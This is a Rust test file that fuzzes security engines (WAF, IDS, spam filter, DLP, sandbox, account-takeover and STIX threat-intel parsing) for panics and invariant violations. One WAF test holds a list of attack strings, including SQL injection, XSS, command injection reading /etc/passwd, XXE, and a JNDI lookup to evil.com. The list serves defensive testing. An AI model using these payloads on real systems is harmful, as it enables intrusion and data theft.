//! Fuzz / property-based tests for security crates.
//!
//! Guarantees:no panics on arbitrary input, no infinite loops (bounded by iteration count),
//! deterministic scoring properties, and basic invariant checking.

use fuzz_tests::*;
use rand::Rng;
use std::net::{IpAddr, Ipv4Addr};

// ===========================================================================
// WAF Engine — No-panic + invariant tests
// ===========================================================================

mod waf_fuzz {
    use super::*;
    use waf_engine::{
        config::WafConfig,
        engine::{HttpRequest, WafEngine},
    };

    fn make_engine() -> WafEngine {
        WafEngine::new(WafConfig::default())
    }

    #[test]
    fn fuzz_waf_inspect_random_paths() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let path_len = rng.random_range(0..500);
            let path = random_ascii(path_len);
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "GET",
                path: &path,
                query_string: None,
                headers: &[],
                body: None,
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_random_queries() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let qs_len = rng.random_range(0..300);
            let qs = random_ascii(qs_len);
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "GET",
                path: "/api/test",
                query_string: Some(&qs),
                headers: &[],
                body: None,
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_random_bodies() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..3_000 {
            let body_len = rng.random_range(0..1_000);
            let body = random_ascii(body_len);
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "POST",
                path: "/api/data",
                query_string: None,
                headers: &[("content-type".into(), "application/json".into())],
                body: Some(&body),
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_random_headers() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..3_000 {
            let num_headers = rng.random_range(0..20);
            let headers: Vec<(String, String)> = (0..num_headers)
                .map(|_| {
                    let name_len = rng.random_range(1..30);
                    let val_len = rng.random_range(0..200);
                    (random_ascii(name_len), random_ascii(val_len))
                })
                .collect();
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(192, 168, 1, 1)),
                method: "GET",
                path: "/",
                query_string: None,
                headers: &headers,
                body: None,
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_inspect_unicode() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..2_000 {
            let path = random_unicode(rng.random_range(0..200));
            let qs = random_unicode(rng.random_range(0..200));
            let body = random_unicode(rng.random_range(0..500));
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "POST",
                path: &path,
                query_string: Some(&qs),
                headers: &[],
                body: Some(&body),
            };
            let _ = engine.inspect(&req);
        }
    }

    #[test]
    fn fuzz_waf_known_attack_strings_no_panic() {
        let engine = make_engine();
        let large_string = "a".repeat(100_000);
        let attacks = vec![
            "' OR 1=1 --",
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "; cat /etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/x}",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "O:4:\"Test\":0:{}",
            "\x00\x01\x02\x03\x04\x05\x7e\x7f",
            large_string.as_str(),
        ];

        for attack in attacks {
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                method: "GET",
                path: attack,
                query_string: Some(attack),
                headers: &[("x-forwarded-for".into(), attack.into())],
                body: Some(attack),
            };
            let _ = engine.inspect(&req);
        }
    }
}

// ===========================================================================
// IDS Engine — No-panic on arbitrary payloads
// ===========================================================================

mod ids_fuzz {
    use super::*;
    use ids_engine::{config::IdsConfig, engine::IdsEngine};

    fn make_engine() -> IdsEngine {
        IdsEngine::new(IdsConfig::default()).expect("default IDS config should not fail")
    }

    #[test]
    fn fuzz_ids_inspect_random_payloads() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let payload_len = rng.random_range(0..2_000);
            let payload = random_bytes(payload_len);
            let (verdict, alerts) = engine.inspect(
                IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                rng.random_range(1..65535),
                "tcp",
                &payload,
            );
            // Alert list invariant:all alerts must have non-empty message
            for alert in &alerts {
                assert!(alert.id > 0, "Alert must have a valid ID");
            }
            let _ = verdict;
        }
    }

    #[test]
    fn fuzz_ids_inspect_protocol_strings() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        let protocols = [
            "tcp", "udp", "smtp", "dns", "tls", "http", "", "UNKNOWN", "💀",
        ];
        for _ in 0..3_000 {
            let protocol = protocols[rng.random_range(0..protocols.len())];
            let payload_len = rng.random_range(0..500);
            let payload = random_bytes(payload_len);
            let _ = engine.inspect(
                IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)),
                25,
                protocol,
                &payload,
            );
        }
    }

    #[test]
    fn fuzz_ids_large_payload_no_hang() {
        let engine = make_engine();
        // 1MB payload should complete without hanging or panicking.
        // A `#[timeout]` attribute is intentionally omitted because the IDS
        // engine performs bounded linear scans — a 1MB payload is expected to
        // complete well within the test runner's default timeout (60s).
        let large = vec![0x41u8; 1_024 * 1_024];
        let _ = engine.inspect(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)), 80, "tcp", &large);
    }

    #[test]
    fn fuzz_ids_binary_payloads() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        // All possible byte values
        for _ in 0..1_000 {
            let len = rng.random_range(1..200);
            let payload: Vec<u8> = (0..len).map(|_| rng.random::<u8>()).collect();
            let _ = engine.inspect(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)), 443, "tls", &payload);
        }
    }
}

// ===========================================================================
// Spam Filter — No-panic + scoring invariants
// ===========================================================================

mod spam_fuzz {
    use super::*;
    use spam_filter::engine::SpamEngine;

    #[test]
    fn fuzz_spam_analyze_random_bodies() {
        let engine = SpamEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..3_000 {
            let body_len = rng.random_range(0..2_000);
            let body = random_ascii(body_len);
            let headers: Vec<(String, String)> = vec![];
            let verdict = engine.analyze(&body, &headers, None);
            // Score should always be finite
            assert!(verdict.score.is_finite(), "Spam score must be finite");
        }
    }

    #[test]
    fn fuzz_spam_analyze_with_headers() {
        let engine = SpamEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..2_000 {
            let body = random_ascii(rng.random_range(0..500));
            let num_headers = rng.random_range(0..15);
            let headers: Vec<(String, String)> = (0..num_headers)
                .map(|_| {
                    (
                        random_ascii(rng.random_range(1..30)),
                        random_ascii(rng.random_range(0..200)),
                    )
                })
                .collect();
            let auth = if rng.random_bool(0.5) {
                Some(random_ascii(rng.random_range(0..100)))
            } else {
                None
            };
            let verdict = engine.analyze(&body, &headers, auth.as_deref());
            assert!(verdict.score.is_finite());
        }
    }

    #[test]
    fn fuzz_spam_unicode_bodies() {
        let engine = SpamEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..2_000 {
            let body = random_unicode(rng.random_range(0..1_000));
            let verdict = engine.analyze(&body, &[], None);
            assert!(verdict.score.is_finite());
        }
    }

    #[test]
    fn fuzz_spam_training_no_panic() {
        let engine = SpamEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..1_000 {
            let text_len = rng.random_range(0..500);
            let text = random_ascii(text_len);
            if rng.random_bool(0.5) {
                // Training may legitimately reject inputs (e.g. empty/too-short
                // text) — we only assert that no panic occurs.
                let _ = engine.train_spam(&text);
            } else {
                let _ = engine.train_ham(&text);
            }
        }
    }

    #[test]
    fn fuzz_spam_empty_input() {
        let engine = SpamEngine::new();
        let verdict = engine.analyze("", &[], None);
        assert!(verdict.score.is_finite());
    }
}

// ===========================================================================
// DLP Engine — No-panic + PII detection invariants
// ===========================================================================

mod dlp_fuzz {
    use super::*;
    use dlp_engine::engine::DlpEngine;

    #[test]
    fn fuzz_dlp_scan_random_text() {
        let engine = DlpEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let body_len = rng.random_range(0..1_000);
            let body = random_ascii(body_len);
            let verdict = engine.scan(&body, None);
            // Findings must be non-negative
            assert!(
                verdict.pii_findings.len() < 10_000,
                "Shouldn't produce unreasonable findings"
            );
        }
    }

    #[test]
    fn fuzz_dlp_scan_with_domains() {
        let engine = DlpEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();
        let domains = ["example.com", "internal.corp", "gov.us", "partner.io"];

        for _ in 0..2_000 {
            let body = random_ascii(rng.random_range(0..500));
            let domain = domains[rng.random_range(0..domains.len())];
            let _ = engine.scan(&body, Some(domain));
        }
    }

    #[test]
    fn fuzz_dlp_known_patterns_no_panic() {
        let engine = DlpEngine::new();

        // Strings that mimic PII patterns
        let test_strings = [
            "My SSN is 123-45-6789",
            "Credit card: 4111-1111-1111-1111",
            "Call me at (555) 123-4567",
            "Email: test@example.com",
            "AKIAIOSFODNN7EXAMPLE",                 // AWS key-like
            "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345", // GitHub token-like
            &"a]".repeat(10_000),                   // Pathological regex input
            &"\x00".repeat(100),                    // Null bytes
        ];

        for s in &test_strings {
            let _ = engine.scan(s, None);
        }
    }

    #[test]
    fn fuzz_dlp_unicode() {
        let engine = DlpEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..2_000 {
            let body = random_unicode(rng.random_range(0..500));
            let _ = engine.scan(&body, None);
        }
    }
}

// ===========================================================================
// Sandbox Engine — No-panic on arbitrary bytes
// ===========================================================================

mod sandbox_fuzz {
    use super::*;
    use sandbox::engine::SandboxEngine;

    #[test]
    fn fuzz_sandbox_analyze_random_bytes() {
        let engine = SandboxEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..3_000 {
            let data_len = rng.random_range(0..5_000);
            let data = random_bytes(data_len);
            let filename = if rng.random_bool(0.5) {
                Some(format!(
                    "file_{}.{}",
                    random_string(5),
                    random_extension(&mut rng)
                ))
            } else {
                None
            };
            let _ = engine.analyze(&data, filename.as_deref());
        }
    }

    #[test]
    fn fuzz_sandbox_dangerous_extensions() {
        let engine = SandboxEngine::new();

        let extensions = [
            "exe", "dll", "bat", "cmd", "ps1", "vbs", "js", "hta", "scr", "pif", "com", "msi",
            "jar", "py", "sh", "elf",
        ];
        for ext in &extensions {
            let data = random_bytes(500);
            let filename = format!("test.{}", ext);
            let result = engine.analyze(&data, Some(&filename));
            // Should not panic — may reject or quarantine
            let _ = result;
        }
    }

    #[test]
    fn fuzz_sandbox_zip_magic_bytes() {
        let engine = SandboxEngine::new();

        // ZIP magic header followed by random data
        let mut data = vec![0x50, 0x4B, 0x03, 0x04];
        let mut rng = fuzz_tests::fuzz_rng();
        for _ in 0..500 {
            data.push(rng.random::<u8>());
        }
        let _ = engine.analyze(&data, Some("archive.zip"));

        // PE magic
        let mut pe_data = vec![0x4D, 0x5A];
        for _ in 0..500 {
            pe_data.push(rng.random::<u8>());
        }
        let _ = engine.analyze(&pe_data, Some("program.exe"));

        // PDF magic
        let mut pdf_data = b"%PDF-1.4\n".to_vec();
        for _ in 0..500 {
            pdf_data.push(rng.random::<u8>());
        }
        let _ = engine.analyze(&pdf_data, Some("document.pdf"));
    }

    #[test]
    fn fuzz_sandbox_empty_and_large() {
        let engine = SandboxEngine::new();

        // Empty
        let _ = engine.analyze(&[], None);
        let _ = engine.analyze(&[], Some("empty.txt"));

        // Moderately large (100KB)
        let large = vec![0x41u8; 100 * 1024];
        let _ = engine.analyze(&large, Some("large.bin"));
    }

    fn random_extension(rng: &mut impl Rng) -> String {
        let exts = [
            "txt", "doc", "pdf", "exe", "zip", "png", "html", "js", "py", "csv",
        ];
        exts[rng.random_range(0..exts.len())].into()
    }
}

// ===========================================================================
// ATO Protection — No-panic + risk score invariants
// ===========================================================================

mod ato_fuzz {
    use super::*;
    use ato_protection::{config::AtoConfig, engine::AtoEngine, session::LoginEvent};
    use chrono::Utc;

    fn make_engine() -> AtoEngine {
        AtoEngine::with_config(AtoConfig::default())
    }

    #[test]
    fn fuzz_ato_evaluate_random_logins() {
        let engine = make_engine();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let event = LoginEvent {
                user_id: random_string(rng.random_range(1..50)),
                ip_address: format!(
                    "{}.{}.{}.{}",
                    rng.random_range(0..256),
                    rng.random_range(0..256),
                    rng.random_range(0..256),
                    rng.random_range(0..256)
                ),
                user_agent: random_ascii(rng.random_range(0..200)),
                latitude: if rng.random_bool(0.7) {
                    Some(rng.random_range(-90.0..90.0))
                } else {
                    None
                },
                longitude: if rng.random_bool(0.7) {
                    Some(rng.random_range(-180.0..180.0))
                } else {
                    None
                },
                timestamp: Utc::now(),
                success: rng.random_bool(0.5),
                tls_fingerprint: None, // Skip TLS fingerprint in fuzz tests
                device_fingerprint: None,
            };
            let verdict = engine.evaluate(&event);
            assert!(verdict.risk_score.is_finite(), "Risk score must be finite");
            assert!(verdict.risk_score >= 0.0, "Risk score must be >= 0");
        }
    }

    #[test]
    fn fuzz_ato_garbage_ips() {
        let engine = make_engine();

        let garbage_ips = [
            "",
            "not-an-ip",
            "999.999.999.999",
            "::1",
            "fe80::1%eth0",
            "0.0.0.0",
            "255.255.255.255",
            "10.0.0.😀",
        ];

        for ip in &garbage_ips {
            let event = LoginEvent {
                user_id: "test_user".into(),
                ip_address: ip.to_string(),
                user_agent: "test-agent".into(),
                latitude: None,
                longitude: None,
                timestamp: Utc::now(),
                success: true,
                tls_fingerprint: None,
                device_fingerprint: None,
            };
            // Must not panic
            let _ = engine.evaluate(&event);
        }
    }
}

// ===========================================================================
// Threat Intel — No-panic on garbage IPs and domains
// ===========================================================================

mod threat_intel_fuzz {
    use super::*;
    use threat_intel::ThreatIntelEngine;

    #[test]
    fn fuzz_threat_intel_check_random_ips() {
        let engine = ThreatIntelEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let ip = if rng.random_bool(0.5) {
                // Valid-shaped IP
                format!(
                    "{}.{}.{}.{}",
                    rng.random_range(0..256),
                    rng.random_range(0..256),
                    rng.random_range(0..256),
                    rng.random_range(0..256)
                )
            } else {
                // Garbage
                random_ascii(rng.random_range(0..50))
            };
            let _ = engine.check_ip(&ip);
        }
    }

    #[test]
    fn fuzz_threat_intel_check_random_domains() {
        let engine = ThreatIntelEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let domain = if rng.random_bool(0.5) {
                format!(
                    "{}.{}.com",
                    random_string(rng.random_range(1..20)),
                    random_string(rng.random_range(1..10))
                )
            } else {
                random_unicode(rng.random_range(0..50))
            };
            let _ = engine.check_domain(&domain);
        }
    }

    #[test]
    fn fuzz_threat_intel_combined_check() {
        let engine = ThreatIntelEngine::new();
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..3_000 {
            let ip = if rng.random_bool(0.7) {
                Some(format!(
                    "{}.{}.{}.{}",
                    rng.random_range(0..256),
                    rng.random_range(0..256),
                    rng.random_range(0..256),
                    rng.random_range(0..256)
                ))
            } else {
                None
            };
            let domain = if rng.random_bool(0.7) {
                Some(format!(
                    "{}.example.com",
                    random_string(rng.random_range(1..20))
                ))
            } else {
                None
            };
            let _ = engine.check(ip.as_deref(), domain.as_deref());
        }
    }
}

// ===========================================================================
// STIX/TAXII parsing fuzz
// ===========================================================================

mod stix_fuzz {
    use super::*;
    use threat_intel::stix_taxii::{extract_indicators, StixBundle};

    #[test]
    fn fuzz_stix_extract_indicators_random() {
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..5_000 {
            let pattern = random_ascii(rng.random_range(0..500));
            let _ = extract_indicators(&pattern);
        }
    }

    #[test]
    fn fuzz_stix_extract_indicators_unicode() {
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..2_000 {
            let pattern = random_unicode(rng.random_range(0..300));
            let _ = extract_indicators(&pattern);
        }
    }

    #[test]
    fn fuzz_stix_bundle_parse_random_json() {
        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..2_000 {
            let json = random_ascii(rng.random_range(0..500));
            let _ = serde_json::from_str::<StixBundle>(&json);
        }
    }

    #[test]
    fn fuzz_stix_bundle_parse_almost_valid() {
        // JSON objects that are almost valid STIX bundles
        let almost_valid = [
            r#"{"type":"bundle","id":"bundle --1","objects":[]}"#,
            r#"{"type":"bundle","id":"","objects":[{"type":"indicator","id":"ind --1"}]}"#,
            r#"{"type":"bundle","id":"x","objects":[{"type":"unknown","id":"u --1"}]}"#,
            r#"{"type":"bundle","id":"x"}"#,
            r#"{}"#,
            r#"[]"#,
            r#"null"#,
        ];

        for json in &almost_valid {
            let _ = serde_json::from_str::<StixBundle>(json);
        }
    }

    // ── SM12 F12: output oracles (the loops above discarded results, so a
    //    constant-empty extractor or a parse that always failed would pass
    //    every iteration) ─────────────────────────────────────────────────

    fn first_indicator_id(bundle: &StixBundle) -> String {
        for obj in &bundle.objects {
            if let threat_intel::stix_taxii::StixObject::Indicator(ind) = obj {
                return ind.id.clone();
            }
        }
        String::new()
    }

    /// Oracle: every observable EMBEDDED in a randomized pattern must be
    /// extracted with its exact value. A constant-empty `extract_indicators`
    /// fails on the first iteration.
    #[test]
    fn fuzz_stix_extract_finds_embedded_observables() {
        let mut rng = fuzz_tests::fuzz_rng();
        for i in 0..2_000 {
            let ip = format!(
                "10.{i}.{}.{}",
                rng.random_range(0..256),
                rng.random_range(0..256)
            );
            let domain = format!("evil-{i}.example.test");
            let email = format!("bad{i}@evil-{i}.example.test");
            let url = format!("http://{domain}/payload{i}");
            let hash = format!("{:064x}", i as u128);
            let noise = random_ascii(rng.random_range(0..40));
            let pattern = format!(
                "{noise}[ipv4-addr:value = '{ip}'] AND [domain-name:value = '{domain}'] AND [url:value = '{url}'] AND [email-addr:value = '{email}'] AND [file:hashes.'SHA-256' = '{hash}']"
            );

            let extracted = extract_indicators(&pattern);
            assert!(
                !extracted.is_empty(),
                "constant-empty extractor regression: nothing found in pattern {i}"
            );
            assert!(
                extracted.iter().any(|ind| matches!(ind,
                    threat_intel::stix_taxii::ExtractedIndicator::Ipv4(v) if *v == ip)),
                "embedded IPv4 {ip} not extracted from pattern {i}: {extracted:?}"
            );
            assert!(
                extracted.iter().any(|ind| matches!(ind,
                    threat_intel::stix_taxii::ExtractedIndicator::Domain(v) if *v == domain)),
                "embedded domain {domain} not extracted from pattern {i}: {extracted:?}"
            );
            assert!(
                extracted.iter().any(|ind| matches!(ind,
                    threat_intel::stix_taxii::ExtractedIndicator::Url(v) if *v == url)),
                "embedded URL {url} not extracted from pattern {i}"
            );
            assert!(
                extracted.iter().any(|ind| matches!(ind,
                    threat_intel::stix_taxii::ExtractedIndicator::Email(v) if *v == email)),
                "embedded email {email} not extracted from pattern {i}"
            );
            assert!(
                extracted.iter().any(|ind| matches!(ind,
                    threat_intel::stix_taxii::ExtractedIndicator::FileHash(alg, v)
                        if alg == "SHA-256" && *v == hash)),
                "embedded SHA-256 hash not extracted from pattern {i}"
            );
        }
    }

    /// Oracle: a VALID bundle serializes, parses back, and `process_bundle`
    /// surfaces the embedded indicator — a deserializer that always failed
    /// (or a processor that always returned empty) fails here.
    #[test]
    fn fuzz_stix_bundle_round_trip() {
        let mut rng = fuzz_tests::fuzz_rng();
        for i in 0..1_000 {
            let domain = format!("c2-{i}-{}.evil.test", rng.random_range(0..100_000));
            let bundle = StixBundle {
                object_type: "bundle".to_string(),
                id: format!("bundle--{:08x}-0000-4000-8000-{:012x}", i, i as u128),
                objects: vec![threat_intel::stix_taxii::StixObject::Indicator(
                    threat_intel::stix_taxii::StixIndicator {
                        id: format!("indicator--{:08x}-1111-4000-8000-{:012x}", i, i as u128),
                        created: None,
                        modified: None,
                        name: Some(format!("indicator {i}")),
                        description: None,
                        pattern: Some(format!("[domain-name:value = '{domain}']")),
                        pattern_type: Some("stix".to_string()),
                        indicator_types: vec!["malicious-activity".to_string()],
                        valid_from: None,
                        valid_until: None,
                        confidence: Some(80),
                        kill_chain_phases: vec![],
                    },
                )],
            };

            let json = serde_json::to_string(&bundle).expect("bundle serializes");
            let parsed: StixBundle =
                serde_json::from_str(&json).expect("our own serialized bundle must parse back");

            let processed = threat_intel::stix_taxii::process_bundle(&parsed);
            assert_eq!(
                processed.len(),
                1,
                "process_bundle must surface the embedded indicator"
            );
            assert_eq!(processed[0].stix_id, first_indicator_id(&bundle));
            assert!(
                matches!(
                    &processed[0].indicator,
                    threat_intel::stix_taxii::ExtractedIndicator::Domain(v) if *v == domain
                ),
                "the embedded domain {domain} must survive the round trip, got {:?}",
                processed[0].indicator
            );

            // Trailing whitespace is legal JSON — the parser must not
            // regress on it.
            let padded = format!("{json}  ");
            let reparsed: StixBundle =
                serde_json::from_str(&padded).expect("bundle + trailing whitespace must parse");
            assert_eq!(reparsed.id, bundle.id);
        }
    }
}

// ===========================================================================
// Cross-crate:Combined security pipeline fuzz
// ===========================================================================

mod combined_fuzz {
    use super::*;
    use dlp_engine::engine::DlpEngine;
    use sandbox::engine::SandboxEngine;
    use spam_filter::engine::SpamEngine;
    use threat_intel::ThreatIntelEngine;
    use waf_engine::{
        config::WafConfig,
        engine::{HttpRequest, WafEngine},
    };

    #[test]
    fn fuzz_email_delivery_pipeline() {
        // Simulate the security checks an email goes through:// 1. WAF inspect the API call
        // 2. Threat-intel check sender IP/domain
        // 3. Spam filter on body
        // 4. DLP scan on body
        // 5. Sandbox analyze attachment

        let waf = WafEngine::new(WafConfig::default());
        let ti = ThreatIntelEngine::new();
        let spam = SpamEngine::new();
        let dlp = DlpEngine::new();
        let sandbox_eng = SandboxEngine::new();

        let mut rng = fuzz_tests::fuzz_rng();

        for _ in 0..1_000 {
            // 1. WAF
            let body = random_ascii(rng.random_range(10..500));
            let req = HttpRequest {
                client_ip: IpAddr::V4(Ipv4Addr::new(
                    rng.random_range(1..255),
                    rng.random_range(0..255),
                    rng.random_range(0..255),
                    rng.random_range(1..255),
                )),
                method: "POST",
                path: "/v1/messages",
                query_string: None,
                headers: &[("content-type".into(), "application/json".into())],
                body: Some(&body),
            };
            let _ = waf.inspect(&req);

            // 2. Threat-intel
            let sender_ip = format!(
                "{}.{}.{}.{}",
                rng.random_range(1..255),
                rng.random_range(0..255),
                rng.random_range(0..255),
                rng.random_range(1..255)
            );
            let _ = ti.check_ip(&sender_ip);

            // 3. Spam
            let email_body = random_ascii(rng.random_range(50..500));
            let _ = spam.analyze(&email_body, &[], None);

            // 4. DLP
            let _ = dlp.scan(&email_body, Some("recipient.com"));

            // 5. Sandbox
            let attachment = random_bytes(rng.random_range(0..1_000));
            let _ = sandbox_eng.analyze(&attachment, Some("attachment.pdf"));
        }
    }
}

// ===========================================================================
// random_bytes is already exported as `pub fn random_bytes(len: usize)`
// from fuzz_tests::lib (see src/lib.rs:62).  The private copy below was a
// duplicate — keeping it would create confusion.  All callers should use the
// shared `fuzz_tests::random_bytes()` instead.  (O-28.3)
// ===========================================================================
